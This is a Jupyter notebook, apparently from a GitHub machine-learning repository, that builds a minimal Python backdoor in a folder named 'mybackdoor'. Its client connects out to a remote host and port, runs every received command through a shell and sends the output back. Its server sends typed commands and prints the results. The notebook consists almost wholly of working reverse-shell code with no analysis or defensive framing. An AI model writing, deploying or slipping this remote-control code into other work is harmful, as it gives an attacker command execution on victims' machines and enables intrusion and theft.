{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPet6QdIpYu1W44/hjxeHM3",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/elgrhy/machinelearning/blob/main/Cybersecurity.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "$ mkdir mybackdoor && cd mybackdoor\n",
        "$ touch client.py server.py"
      ],
      "metadata": {
        "id": "thIUHa-jY9y1"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Client Component"
      ],
      "metadata": {
        "id": "fRdr3LS5ZO77"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import socket\n",
        "import subprocess\n",
        "\n",
        "REMOTE_HOST = '127.0.0.1' # '192.168.43.82'\n",
        "REMOTE_PORT = 8081 # 2222\n",
        "client = socket.socket()\n",
        "print(\"[-] Connection Initiating...\")\n",
        "client.connect((REMOTE_HOST, REMOTE_PORT))\n",
        "print(\"[-] Connection initiated!\")\n",
        "\n",
        "while True:\n",
        "    print(\"[-] Awaiting commands...\")\n",
        "    command = client.recv(1024)\n",
        "    command = command.decode()\n",
        "    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)\n",
        "    output = op.stdout.read()\n",
        "    output_error = op.stderr.read()\n",
        "    print(\"[-] Sending response...\")\n",
        "    client.send(output + output_error)"
      ],
      "metadata": {
        "id": "uGoon4RdZQwa"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "To run"
      ],
      "metadata": {
        "id": "hjh_X6b1ZrFT"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "python client.py"
      ],
      "metadata": {
        "id": "nfW8lx7mZgZM"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Server components"
      ],
      "metadata": {
        "id": "BF0tWPeuZ9pI"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import socket\n",
        "\n",
        "HOST = '127.0.0.1' # '192.168.43.82'\n",
        "PORT = 8081 # 2222\n",
        "server = socket.socket()\n",
        "server.bind((HOST, PORT))\n",
        "print('[+] Server Started')\n",
        "print('[+] Listening For Client Connection ...')\n",
        "server.listen(1)\n",
        "client, client_addr = server.accept()\n",
        "print(f'[+] {client_addr} Client connected to the server')\n",
        "\n",
        "while True:\n",
        "    command = input('Enter Command : ')\n",
        "    command = command.encode()\n",
        "    client.send(command)\n",
        "    print('[+] Command sent')\n",
        "    output = client.recv(1024)\n",
        "    output = output.decode()\n",
        "    print(f\"Output: {output}\")"
      ],
      "metadata": {
        "id": "rQzMEerdZvJm"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "python server.py"
      ],
      "metadata": {
        "id": "czbY00dPZ7tI"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "4bW95a1LaKTZ"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}